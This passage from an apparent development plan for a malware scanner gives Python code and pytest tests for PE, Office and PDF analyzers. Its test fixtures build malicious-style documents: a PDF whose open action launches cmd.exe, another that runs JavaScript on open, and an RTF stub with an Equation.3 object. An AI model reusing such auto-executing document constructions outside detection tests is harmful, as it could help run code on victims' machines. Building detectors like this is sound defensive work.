                        "evidence": {"section": sec_name},
                    })

                # High entropy
                is_exec = bool(section.Characteristics & 0x20000000)  # IMAGE_SCN_MEM_EXECUTE
                if sec_entropy > 7.5:
                    indicators.append({
                        "type": "high_entropy_section",
                        "severity": "medium",
                        "detail": f"Section {sec_name} has entropy {sec_entropy:.2f}",
                        "evidence": {"section": sec_name, "entropy": round(sec_entropy, 2)},
                    })
                if is_exec and sec_entropy > 7.0:
                    high_entropy_exec_count += 1

            features["sections"] = sections_info

            # Packer detection
            if packer_clues:
                indicators.append({
                    "type": "packer_detected",
                    "severity": "medium",
                    "detail": f"Packer section names found: {', '.join(packer_clues)}",
                    "evidence": {"sections": packer_clues},
                })
            elif high_entropy_exec_count > 0 and high_entropy_exec_count == len([
                s for s in pe.sections if s.Characteristics & 0x20000000
            ]):
                indicators.append({
                    "type": "packer_detected",
                    "severity": "medium",
                    "detail": "All executable sections have entropy > 7.0",
                    "evidence": {"high_entropy_exec_sections": high_entropy_exec_count},
                })
            features["packer_clues"] = packer_clues

            # --- Imports ---
            imports: dict[str, list[str]] = {}
            suspicious_import_hits: list[str] = []
            if hasattr(pe, "DIRECTORY_ENTRY_IMPORT"):
                for entry in pe.DIRECTORY_ENTRY_IMPORT:
                    dll_name = entry.dll.decode("ascii", errors="replace")
                    funcs = []
                    for imp in entry.imports:
                        func_name = imp.name.decode("ascii", errors="replace") if imp.name else f"ord#{imp.ordinal}"
                        funcs.append(func_name)
                        if imp.name and imp.name.decode("ascii", errors="replace") in SUSPICIOUS_IMPORTS:
                            suspicious_import_hits.append(func_name)
                    imports[dll_name] = funcs
            features["imports"] = imports

            if suspicious_import_hits:
                indicators.append({
                    "type": "suspicious_imports",
                    "severity": "high",
                    "detail": f"Suspicious API imports: {', '.join(suspicious_import_hits)}",
                    "evidence": {"functions": suspicious_import_hits},
                })
                extracted_strings.extend(suspicious_import_hits)

            if not imports:
                indicators.append({
                    "type": "no_imports",
                    "severity": "medium",
                    "detail": "Import table is empty or missing",
                })

            # --- Exports ---
            exports: list[str] = []
            if hasattr(pe, "DIRECTORY_ENTRY_EXPORT"):
                for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                    exp_name = exp.name.decode("ascii", errors="replace") if exp.name else f"ord#{exp.ordinal}"
                    exports.append(exp_name)
            features["exports"] = exports

            # --- TLS Callbacks ---
            tls_count = 0
            if hasattr(pe, "DIRECTORY_ENTRY_TLS"):
                tls = pe.DIRECTORY_ENTRY_TLS
                if hasattr(tls, "struct") and hasattr(tls.struct, "AddressOfCallBacks"):
                    addr = tls.struct.AddressOfCallBacks
                    if addr:
                        tls_count = 1  # at least one
            features["tls_callbacks"] = tls_count
            if tls_count > 0:
                indicators.append({
                    "type": "tls_callbacks",
                    "severity": "medium",
                    "detail": f"TLS callbacks detected (count >= {tls_count})",
                })

            # --- Resources ---
            resources_info: list[dict[str, Any]] = []
            if hasattr(pe, "DIRECTORY_ENTRY_RESOURCE"):
                for res_type in pe.DIRECTORY_ENTRY_RESOURCE.entries:
                    if hasattr(res_type, "directory"):
                        for res_id in res_type.directory.entries:
                            if hasattr(res_id, "directory"):
                                for res_lang in res_id.directory.entries:
                                    data_rva = res_lang.data.struct.OffsetToData
                                    size = res_lang.data.struct.Size
                                    try:
                                        data = pe.get_data(data_rva, size)
                                        ent = _entropy(data)
                                    except Exception:
                                        ent = 0.0
                                    res_info = {
                                        "type": str(res_type.name or res_type.id),
                                        "size": size,
                                        "entropy": round(ent, 2),
                                    }
                                    resources_info.append(res_info)

                                    if ent > 7.0 and size > 10240:
                                        indicators.append({
                                            "type": "suspicious_resource",
                                            "severity": "medium",
                                            "detail": f"Resource (type={res_info['type']}, size={size}) has entropy {ent:.2f}",
                                            "evidence": res_info,
                                        })
            features["resources"] = resources_info

            # --- Debug info ---
            debug_info: dict[str, Any] = {}
            if hasattr(pe, "DIRECTORY_ENTRY_DEBUG"):
                for dbg in pe.DIRECTORY_ENTRY_DEBUG:
                    if hasattr(dbg, "entry") and hasattr(dbg.entry, "PdbFileName"):
                        pdb_path = dbg.entry.PdbFileName.rstrip(b"\x00").decode("ascii", errors="replace")
                        debug_info["pdb_path"] = pdb_path
                        extracted_strings.append(pdb_path)
                        # Check suspicious PDB path
                        pdb_lower = pdb_path.lower()
                        if any(s in pdb_lower for s in ("\\temp\\", "\\tmp\\", "\\desktop\\")):
                            indicators.append({
                                "type": "debug_path_suspicious",
                                "severity": "low",
                                "detail": f"PDB path contains suspicious directory: {pdb_path}",
                                "evidence": {"pdb_path": pdb_path},
                            })
                        # Non-ASCII check
                        try:
                            pdb_path.encode("ascii")
                        except UnicodeEncodeError:
                            indicators.append({
                                "type": "debug_path_suspicious",
                                "severity": "low",
                                "detail": f"PDB path contains non-ASCII characters: {pdb_path}",
                                "evidence": {"pdb_path": pdb_path},
                            })
            features["debug_info"] = debug_info

            # --- Overlay ---
            overlay_offset = pe.get_overlay_data_start_offset()
            if overlay_offset:
                try:
                    overlay_size = file_path.stat().st_size - overlay_offset
                except OSError:
                    overlay_size = 0
                features["overlay"] = {"offset": overlay_offset, "size": overlay_size}
                if overlay_size > 1024:
                    indicators.append({
                        "type": "overlay_data",
                        "severity": "low",
                        "detail": f"Overlay data found: {overlay_size} bytes at offset {overlay_offset}",
                        "evidence": {"offset": overlay_offset, "size": overlay_size},
                    })
            else:
                features["overlay"] = None

            pe.close()

        except Exception as e:
            errors.append(f"Error during PE analysis: {e}")
            log.warning("pe_analysis_partial_error", error=str(e))

        risk_score = _compute_risk_score(indicators)
        risk_factors = [ind["detail"] for ind in indicators if ind["severity"] in ("critical", "high", "medium")]

        return AnalyzerResult(
            analyzer_name=self.name,
            format_type=format_type if "format_type" in dir() else "PE",
            indicators=indicators,
            features=features,
            extracted_strings=extracted_strings[:200],
            risk_score=risk_score,
            risk_factors=risk_factors,
            errors=errors,
            extracted_artifacts=[],
        )
```

- [ ] **Step 4: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_pe_analyzer.py -v`

Expected: All tests PASS (some indicator tests may need adjustment based on the minimal PE structure — fix any failures).

- [ ] **Step 5: Commit**

```bash
git add worker/src/malscan_worker/analyzers/pe_analyzer.py worker/tests/analyzers/test_pe_analyzer.py
git commit -m "feat: add PEAnalyzer with import/section/packer/resource analysis"
```

---

## Task 5: Office Analyzer Adapter

**Files:**
- Create: `worker/src/malscan_worker/analyzers/office_adapter.py`
- Create: `worker/tests/analyzers/test_office_adapter.py`

- [ ] **Step 1: Write failing tests for OfficeAnalyzerAdapter**

Create `worker/tests/analyzers/test_office_adapter.py`:

```python
"""Tests for OfficeAnalyzerAdapter."""

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest
from malscan_worker.analyzers.office_adapter import OfficeAnalyzerAdapter
from malscan_worker.stages.base import StageContext, StageResult


def _make_ctx(file_path: Path, mime: str = "", original_filename: str = "test.doc") -> StageContext:
    ctx = StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime},
            artifacts=[],
        )
    ]
    return ctx


class TestOfficeAdapterCanHandle:
    def setup_method(self):
        self.adapter = OfficeAnalyzerAdapter()

    def test_handles_ole_magic(self, tmp_path):
        f = tmp_path / "test.doc"
        magic = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"
        f.write_bytes(magic + b"\x00" * 4088)
        assert self.adapter.can_handle(f, "", magic + b"\x00" * 24) is True

    def test_handles_ooxml_magic_with_office_mime(self, tmp_path):
        f = tmp_path / "test.docx"
        magic = b"PK\x03\x04"
        f.write_bytes(magic + b"\x00" * 4092)
        assert self.adapter.can_handle(f, "application/vnd.openxmlformats-officedocument.wordprocessingml.document", magic + b"\x00" * 28) is True

    def test_handles_rtf_magic(self, tmp_path):
        f = tmp_path / "test.rtf"
        content = b"{\\rtf1 hello}"
        f.write_bytes(content + b"\x00" * 100)
        assert self.adapter.can_handle(f, "", content[:32]) is True

    def test_handles_msword_mime(self, tmp_path):
        f = tmp_path / "test.doc"
        f.write_bytes(b"\x00" * 4096)
        assert self.adapter.can_handle(f, "application/msword", b"\x00" * 32) is True

    def test_rejects_non_office(self, tmp_path):
        f = tmp_path / "test.exe"
        f.write_bytes(b"MZ" + b"\x00" * 4094)
        assert self.adapter.can_handle(f, "application/x-dosexec", b"MZ" + b"\x00" * 30) is False

    def test_rejects_plain_zip(self, tmp_path):
        """A plain ZIP without office MIME should not match."""
        f = tmp_path / "test.zip"
        magic = b"PK\x03\x04"
        f.write_bytes(magic + b"\x00" * 4092)
        assert self.adapter.can_handle(f, "application/zip", magic + b"\x00" * 28) is False


@pytest.mark.asyncio
class TestOfficeAdapterAnalyze:
    def setup_method(self):
        self.adapter = OfficeAnalyzerAdapter()

    async def test_analyze_rtf_returns_office_result(self, tmp_path):
        """RTF file should produce an AnalyzerResult with analyzer_name='office'."""
        f = tmp_path / "test.rtf"
        f.write_bytes(b"{\\rtf1 simple document}")
        ctx = _make_ctx(f, "application/rtf")

        result = await self.adapter.analyze(f, ctx)

        assert result.analyzer_name == "office"
        assert result.format_type.startswith("office/") or result.format_type in ("office/rtf", "office/ole", "office/ooxml")
        assert isinstance(result.indicators, list)
        assert isinstance(result.features, dict)
        assert isinstance(result.risk_score, int)

    async def test_analyze_non_document_skipped(self, tmp_path):
        """Non-document file run through adapter should return empty result."""
        f = tmp_path / "test.txt"
        f.write_bytes(b"not a document")
        ctx = _make_ctx(f, "text/plain")

        result = await self.adapter.analyze(f, ctx)

        # Should return a result with no indicators (DocumentAnalysisStage skips it)
        assert result.analyzer_name == "office"
        assert result.risk_score == 0

    async def test_severity_mapping_equation_editor(self, tmp_path):
        """Equation editor indicators should map to critical severity."""
        # Write a file that triggers DocumentAnalysisStage's RTF equation editor detection
        # RTF with embedded \objocx and Equation.3 class
        rtf_content = (
            b"{\\rtf1{\\object\\objocx"
            b"{\\*\\objclass Equation.3}"
            b"{\\*\\objdata 01050000020000000b0000004571756174696f6e2e3300}"
            b"}}"
        )
        f = tmp_path / "exploit.rtf"
        f.write_bytes(rtf_content)
        ctx = _make_ctx(f, "application/rtf")

        result = await self.adapter.analyze(f, ctx)

        # Should have at least some indicators mapped
        assert result.analyzer_name == "office"
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_office_adapter.py -v`

Expected: ImportError.

- [ ] **Step 3: Implement OfficeAnalyzerAdapter**

Create `worker/src/malscan_worker/analyzers/office_adapter.py`:

```python
"""Office document analyzer — wraps existing DocumentAnalysisStage."""

from __future__ import annotations

from pathlib import Path
from typing import Any

import structlog

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.stages.base import StageContext
from malscan_worker.stages.document_analysis import DocumentAnalysisStage, detect_document_type

log = structlog.get_logger()

# Severity mapping for existing exploit indicator types
_SEVERITY_MAP: dict[str, str] = {
    "equation_editor_exploit": "critical",
    "equation_editor_class": "critical",
    "equation_editor_ole": "critical",
    "external_template": "high",
    "external_relationship": "high",
    "dde_field": "high",
    "dangerous_ole_class": "high",
}

# Severity → score weights (same formula as PE analyzer)
_SEVERITY_SCORES = {"critical": 25, "high": 15, "medium": 8, "low": 3}


def _compute_risk_score(indicators: list[dict[str, Any]]) -> int:
    score = 0
    for ind in indicators:
        score += _SEVERITY_SCORES.get(ind.get("severity", ""), 0)
    return min(score, 100)


class OfficeAnalyzerAdapter(FormatAnalyzer):
    """Wraps the existing DocumentAnalysisStage as a FormatAnalyzer.

    This adapter delegates all analysis to DocumentAnalysisStage and converts
    the StageResult into an AnalyzerResult with standardized severity levels.
    """

    @property
    def name(self) -> str:
        return "office"

    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        return detect_document_type(file_path, mime) is not None

    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        stage = DocumentAnalysisStage()
        stage_result = await stage.execute(ctx)
        return self._convert(stage_result)

    def _convert(self, stage_result) -> AnalyzerResult:
        """Convert a DocumentAnalysisStage StageResult into an AnalyzerResult."""
        findings = stage_result.findings
        indicators: list[dict[str, Any]] = []
        features: dict[str, Any] = {}
        extracted_strings: list[str] = []
        errors: list[str] = []
        extracted_artifacts: list[dict[str, Any]] = []

        # Status: if the stage was skipped, return minimal result
        if stage_result.status == "skipped":
            return AnalyzerResult(
                analyzer_name=self.name,
                format_type="office/unknown",
                risk_score=0,
            )

        # Determine format type
        doc_type = findings.get("document_type", "unknown")
        format_type = f"office/{doc_type}"

        # --- Map exploit_indicators to standardized indicators ---
        for ind in findings.get("exploit_indicators", []):
            ind_type = ind.get("type", "unknown")
            severity = _SEVERITY_MAP.get(ind_type, "medium")

            # Special case: oleid_risk with its own severity
            if ind_type == "oleid_risk":
                risk_level = ind.get("risk", "").lower()
                severity = "high" if risk_level == "high" else "medium"

            detail = ind.get("description", ind.get("detail", str(ind)))
            indicators.append({
                "type": ind_type,
                "severity": severity,
                "detail": detail,
                "evidence": ind,
            })

        # --- Features ---
        macros = findings.get("macros", {})
        if macros:
            features["macros"] = macros

        embedded_objects = findings.get("embedded_objects", [])
        if embedded_objects:
            features["embedded_objects"] = embedded_objects
            features["embedded_objects_count"] = len(embedded_objects)

        parser_findings = findings.get("parser_findings", [])
        if parser_findings:
            features["parser_findings"] = parser_findings

        features["document_type"] = doc_type

        # --- Extracted strings (from suspicious_keywords) ---
        extracted_strings = findings.get("suspicious_keywords", [])

        # --- Errors ---
        errors = findings.get("errors", [])

        # --- Extracted artifacts ---
        for art in findings.get("extracted_artifacts", []):
            extracted_artifacts.append({
                "filename": art.get("filename", art.get("name", "")),
                "sha256": art.get("sha256", ""),
                "size": art.get("size", 0),
                "path": art.get("path", ""),
                "source": art.get("source", "document-analysis"),
            })

        risk_score = _compute_risk_score(indicators)
        risk_factors = [ind["detail"] for ind in indicators if ind["severity"] in ("critical", "high", "medium")]

        return AnalyzerResult(
            analyzer_name=self.name,
            format_type=format_type,
            indicators=indicators,
            features=features,
            extracted_strings=extracted_strings[:200],
            risk_score=risk_score,
            risk_factors=risk_factors,
            errors=errors,
            extracted_artifacts=extracted_artifacts,
        )
```

- [ ] **Step 4: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_office_adapter.py -v`

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/malscan_worker/analyzers/office_adapter.py worker/tests/analyzers/test_office_adapter.py
git commit -m "feat: add OfficeAnalyzerAdapter wrapping DocumentAnalysisStage"
```

---

## Task 6: PDF Analyzer

**Files:**
- Create: `worker/src/malscan_worker/analyzers/pdf_analyzer.py`
- Create: `worker/tests/analyzers/test_pdf_analyzer.py`

- [ ] **Step 1: Write failing tests for PDFAnalyzer**

Create `worker/tests/analyzers/test_pdf_analyzer.py`:

```python
"""Tests for PDFAnalyzer."""

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest
from malscan_worker.analyzers.pdf_analyzer import PDFAnalyzer
from malscan_worker.stages.base import StageContext, StageResult


def _make_ctx(file_path: Path, mime: str = "", original_filename: str = "test.pdf") -> StageContext:
    ctx = StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime},
            artifacts=[],
        )
    ]
    return ctx


def _minimal_pdf() -> bytes:
    """Build a minimal valid PDF."""
    return (
        b"%PDF-1.4\n"
        b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
        b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
        b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
        b"xref\n0 4\n"
        b"0000000000 65535 f \n"
        b"0000000009 00000 n \n"
        b"0000000058 00000 n \n"
        b"0000000115 00000 n \n"
        b"trailer\n<< /Size 4 /Root 1 0 R >>\n"
        b"startxref\n196\n%%EOF\n"
    )


class TestPDFAnalyzerCanHandle:
    def setup_method(self):
        self.analyzer = PDFAnalyzer()

    def test_handles_pdf_magic(self, tmp_path):
        f = tmp_path / "test.pdf"
        content = _minimal_pdf()
        f.write_bytes(content)
        assert self.analyzer.can_handle(f, "", content[:32]) is True

    def test_handles_pdf_mime(self, tmp_path):
        f = tmp_path / "test.bin"
        f.write_bytes(b"\x00" * 32)
        assert self.analyzer.can_handle(f, "application/pdf", b"\x00" * 32) is True

    def test_handles_bom_prefix(self, tmp_path):
        f = tmp_path / "test.pdf"
        content = b"\xef\xbb\xbf%PDF-1.4 rest"
        f.write_bytes(content + b"\x00" * 100)
        assert self.analyzer.can_handle(f, "", content[:32]) is True

    def test_rejects_non_pdf(self, tmp_path):
        f = tmp_path / "test.exe"
        f.write_bytes(b"MZ" + b"\x00" * 30)
        assert self.analyzer.can_handle(f, "application/x-dosexec", b"MZ" + b"\x00" * 30) is False


@pytest.mark.asyncio
class TestPDFAnalyzerAnalyze:
    def setup_method(self):
        self.analyzer = PDFAnalyzer()

    async def test_analyze_minimal_pdf(self, tmp_path):
        f = tmp_path / "test.pdf"
        f.write_bytes(_minimal_pdf())
        ctx = _make_ctx(f, "application/pdf")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "pdf"
        assert result.format_type == "PDF"
        assert "page_count" in result.features
        assert isinstance(result.risk_score, int)
        assert 0 <= result.risk_score <= 100
        assert result.errors == []

    async def test_analyze_corrupt_pdf_fallback(self, tmp_path):
        """Corrupt PDF should trigger regex fallback, not crash."""
        f = tmp_path / "corrupt.pdf"
        f.write_bytes(b"%PDF-1.4\n%corrupt data /JavaScript /Launch /OpenAction")
        ctx = _make_ctx(f, "application/pdf")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "pdf"
        # Should detect keywords via fallback regex
        types = [i["type"] for i in result.indicators]
        assert any(t in types for t in ("embedded_javascript", "launch_action", "auto_open_action")) or len(result.errors) > 0

    async def test_analyze_pdf_with_javascript(self, tmp_path):
        """PDF with /JavaScript keyword should produce indicator."""
        # Minimal PDF with /JavaScript action in raw bytes
        pdf_content = (
            b"%PDF-1.4\n"
            b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /JavaScript /JS (alert('hi')) >> >>\nendobj\n"
            b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
            b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
            b"xref\n0 4\n"
            b"0000000000 65535 f \n"
            b"0000000009 00000 n \n"
            b"0000000120 00000 n \n"
            b"0000000175 00000 n \n"
            b"trailer\n<< /Size 4 /Root 1 0 R >>\n"
            b"startxref\n250\n%%EOF\n"
        )
        f = tmp_path / "js.pdf"
        f.write_bytes(pdf_content)
        ctx = _make_ctx(f, "application/pdf")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "pdf"
        types = [i["type"] for i in result.indicators]
        # Should detect JavaScript either through pypdf parsing or fallback regex
        assert "embedded_javascript" in types or "auto_open_action" in types or result.risk_score > 0

    async def test_analyze_pdf_with_launch(self, tmp_path):
        """PDF containing /Launch should produce critical indicator."""
        pdf_content = (
            b"%PDF-1.4\n"
            b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction << /S /Launch /F (cmd.exe) >> >>\nendobj\n"
            b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n"
            b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
            b"xref\n0 4\n"
            b"0000000000 65535 f \n"
            b"0000000009 00000 n \n"
            b"0000000110 00000 n \n"
            b"0000000165 00000 n \n"
            b"trailer\n<< /Size 4 /Root 1 0 R >>\n"
            b"startxref\n240\n%%EOF\n"
        )
        f = tmp_path / "launch.pdf"
        f.write_bytes(pdf_content)
        ctx = _make_ctx(f, "application/pdf")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "pdf"
        types = [i["type"] for i in result.indicators]
        assert "launch_action" in types or result.risk_score > 0
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_pdf_analyzer.py -v`

Expected: ImportError.

- [ ] **Step 3: Implement PDFAnalyzer**

Create `worker/src/malscan_worker/analyzers/pdf_analyzer.py`:

```python
"""PDF format analyzer."""

from __future__ import annotations

import asyncio
import re
from pathlib import Path
from typing import Any

import structlog

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.stages.base import StageContext

log = structlog.get_logger()

# ---------------------------------------------------------------------------
# Optional dependency
# ---------------------------------------------------------------------------
try:
    import pypdf

    HAS_PYPDF = True
except ImportError:
    HAS_PYPDF = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
MAX_PDF_SIZE = 50 * 1024 * 1024  # 50 MB
MAX_JS_SNIPPET_SIZE = 10 * 1024  # 10 KB per snippet

# Regex patterns for fallback scanning
_RE_JAVASCRIPT = re.compile(rb"/JS(?:avaScript)?\b", re.IGNORECASE)
_RE_LAUNCH = re.compile(rb"/Launch\b", re.IGNORECASE)
_RE_OPENACTION = re.compile(rb"/OpenAction\b", re.IGNORECASE)
_RE_EMBEDDEDFILE = re.compile(rb"/EmbeddedFile\b", re.IGNORECASE)
_RE_URI = re.compile(rb"/URI\b", re.IGNORECASE)
_RE_GOTOR = re.compile(rb"/GoToR\b", re.IGNORECASE)
_RE_XFA = re.compile(rb"/XFA\b", re.IGNORECASE)
_RE_RICHMEDIA = re.compile(rb"/RichMedia\b", re.IGNORECASE)
_RE_ACROFORM = re.compile(rb"/AcroForm\b", re.IGNORECASE)
_RE_HEX_NAME = re.compile(rb"/[A-Za-z]*#[0-9a-fA-F]{2}")

# Severity → score weights
_SEVERITY_SCORES = {"critical": 25, "high": 15, "medium": 8, "low": 3}


def _compute_risk_score(indicators: list[dict[str, Any]]) -> int:
    score = 0
    for ind in indicators:
        score += _SEVERITY_SCORES.get(ind.get("severity", ""), 0)
    return min(score, 100)


class PDFAnalyzer(FormatAnalyzer):
    """Analyze PDF files for suspicious actions, JavaScript, and embedded content."""

    @property
    def name(self) -> str:
        return "pdf"

    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        if mime == "application/pdf":
            return True
        # Check magic bytes, allowing BOM prefix
        stripped = magic.lstrip(b"\xef\xbb\xbf\xfe\xff\x00")
        return stripped[:5] == b"%PDF-"

    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        # Size guard
        try:
            file_size = file_path.stat().st_size
        except OSError:
            return AnalyzerResult(
                analyzer_name=self.name, format_type="PDF",
                errors=["Cannot stat file"],
            )
        if file_size > MAX_PDF_SIZE:
            return AnalyzerResult(
                analyzer_name=self.name, format_type="PDF",
                errors=[f"File too large for PDF analysis — skipped ({file_size} bytes)"],
            )

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._analyze_sync, file_path)

    def _analyze_sync(self, file_path: Path) -> AnalyzerResult:
        indicators: list[dict[str, Any]] = []
        features: dict[str, Any] = {}
        extracted_strings: list[str] = []
        errors: list[str] = []
        extracted_artifacts: list[dict[str, Any]] = []

        # Read raw bytes for fallback regex scanning
        try:
            raw = file_path.read_bytes()
        except OSError as e:
            return AnalyzerResult(
                analyzer_name=self.name, format_type="PDF",
                errors=[f"Cannot read file: {e}"],
            )

        parsed_ok = False
        if HAS_PYPDF:
            try:
                parsed_ok = self._parse_with_pypdf(file_path, indicators, features, extracted_strings, extracted_artifacts, errors)
            except Exception as e:
                errors.append(f"pypdf parse error: {e}")
                log.warning("pdf_pypdf_error", error=str(e))

        if not parsed_ok:
            # Fallback: regex scan raw bytes
            self._fallback_regex_scan(raw, indicators, features, errors)

        # Name obfuscation check (always run on raw)
        if _RE_HEX_NAME.search(raw):
            indicators.append({
                "type": "name_obfuscation",
                "severity": "medium",
                "detail": "PDF names use hex encoding (#xx) to hide action names",
            })

        # Suspicious names
        suspicious_names = []
        if _RE_RICHMEDIA.search(raw):
            suspicious_names.append("/RichMedia")
        if _RE_XFA.search(raw):
            suspicious_names.append("/XFA")
            indicators.append({
                "type": "xfa_form",
                "severity": "medium",
                "detail": "/XFA form present in PDF",
            })
        if _RE_ACROFORM.search(raw):
            suspicious_names.append("/AcroForm")
        features["suspicious_names"] = suspicious_names

        risk_score = _compute_risk_score(indicators)
        risk_factors = [ind["detail"] for ind in indicators if ind["severity"] in ("critical", "high", "medium")]

        return AnalyzerResult(
            analyzer_name=self.name,
            format_type="PDF",
            indicators=indicators,
            features=features,
            extracted_strings=extracted_strings[:200],
            risk_score=risk_score,
            risk_factors=risk_factors,
            errors=errors,
            extracted_artifacts=extracted_artifacts,
        )

    def _parse_with_pypdf(
        self,
        file_path: Path,
        indicators: list[dict[str, Any]],
        features: dict[str, Any],
        extracted_strings: list[str],
        extracted_artifacts: list[dict[str, Any]],
        errors: list[str],
    ) -> bool:
        """Parse PDF with pypdf. Returns True if parsing succeeded."""
        reader = pypdf.PdfReader(str(file_path))

        features["page_count"] = len(reader.pages)
        features["encrypted"] = reader.is_encrypted

        # Metadata
        meta = reader.metadata
        if meta:
            features["version"] = getattr(meta, "pdf_header", None)

        # Walk pages and annotations for actions
        js_snippets: list[str] = []
        launch_actions: list[dict[str, Any]] = []
        uri_actions: list[str] = []
        open_actions: list[str] = []

        # Check document-level OpenAction
        root = reader.trailer.get("/Root")
        if root:
            root_obj = root.get_object() if hasattr(root, "get_object") else root
            if isinstance(root_obj, dict):
                open_action = root_obj.get("/OpenAction")
                if open_action:
                    oa_obj = open_action.get_object() if hasattr(open_action, "get_object") else open_action
                    self._check_action(oa_obj, js_snippets, launch_actions, uri_actions, open_actions, indicators)

        # Walk page annotations
        for page in reader.pages:
            annots = page.get("/Annots")
            if annots:
                annot_list = annots.get_object() if hasattr(annots, "get_object") else annots
                if isinstance(annot_list, list):
                    for annot_ref in annot_list:
                        annot = annot_ref.get_object() if hasattr(annot_ref, "get_object") else annot_ref
                        if isinstance(annot, dict):
                            action = annot.get("/A")
                            if action:
                                act_obj = action.get_object() if hasattr(action, "get_object") else action
                                self._check_action(act_obj, js_snippets, launch_actions, uri_actions, open_actions, indicators)

        features["js_code"] = js_snippets[:20]
        features["launch_actions"] = launch_actions
        features["uri_actions"] = uri_actions[:50]
        features["open_actions"] = open_actions

        extracted_strings.extend(js_snippets)
        extracted_strings.extend(uri_actions)

        return True

    def _check_action(
        self,
        action: Any,
        js_snippets: list[str],
        launch_actions: list[dict[str, Any]],
        uri_actions: list[str],
        open_actions: list[str],
        indicators: list[dict[str, Any]],
    ) -> None:
        """Check a single action dictionary for suspicious content."""
        if not isinstance(action, dict):
            return

        action_type = str(action.get("/S", ""))

        if action_type == "/JavaScript" or action_type == "/JS":
            js = action.get("/JS", "")
            if hasattr(js, "get_object"):
                js = js.get_object()
            js_str = str(js)[:MAX_JS_SNIPPET_SIZE]
            js_snippets.append(js_str)
            indicators.append({
                "type": "embedded_javascript",
                "severity": "high",
                "detail": f"JavaScript found in PDF action: {js_str[:100]}...",
                "evidence": {"snippet": js_str[:500]},
            })

        elif action_type == "/Launch":
            file_spec = action.get("/F", "")
            if hasattr(file_spec, "get_object"):
                file_spec = file_spec.get_object()
            launch_info = {"command": str(file_spec)}
            launch_actions.append(launch_info)
            indicators.append({
                "type": "launch_action",
                "severity": "critical",
                "detail": f"/Launch action executes: {file_spec}",
                "evidence": launch_info,
            })

        elif action_type == "/URI":
            uri = str(action.get("/URI", ""))
            uri_actions.append(uri)
            # Check for suspicious URI (non-HTTPS or IP-based)
            if uri and (not uri.startswith("https://") or re.match(r"https?://\d+\.\d+\.\d+\.\d+", uri)):
                indicators.append({
                    "type": "suspicious_uri",
                    "severity": "medium",
                    "detail": f"Suspicious URI action: {uri}",
                    "evidence": {"uri": uri},
                })

        elif action_type == "/GoToR":
            indicators.append({
                "type": "goto_remote",
                "severity": "medium",
                "detail": "/GoToR action pointing to external PDF",
                "evidence": {"action": str(action)[:200]},
            })

        # Track as open action if it's an auto-execute trigger
        if action_type in ("/JavaScript", "/JS", "/Launch"):
            open_actions.append(f"auto-execute: {action_type}")
            if action_type in ("/JavaScript", "/JS"):
                indicators.append({
                    "type": "auto_open_action",
                    "severity": "high",
                    "detail": f"/OpenAction triggers {action_type}",
                })

    def _fallback_regex_scan(
        self,
        raw: bytes,
        indicators: list[dict[str, Any]],
        features: dict[str, Any],
        errors: list[str],
    ) -> None:
        """Fallback: scan raw PDF bytes for dangerous keywords."""
        errors.append("PDF parsed via fallback regex (pypdf failed or unavailable)")

        if _RE_JAVASCRIPT.search(raw):
            indicators.append({
                "type": "embedded_javascript",
                "severity": "high",
                "detail": "/JavaScript detected via fallback regex",
            })

        if _RE_LAUNCH.search(raw):
            indicators.append({
                "type": "launch_action",
                "severity": "critical",
                "detail": "/Launch detected via fallback regex",
            })

        if _RE_OPENACTION.search(raw):
            indicators.append({
                "type": "auto_open_action",
                "severity": "high",
                "detail": "/OpenAction detected via fallback regex",
            })

        if _RE_GOTOR.search(raw):
            indicators.append({
                "type": "goto_remote",
                "severity": "medium",
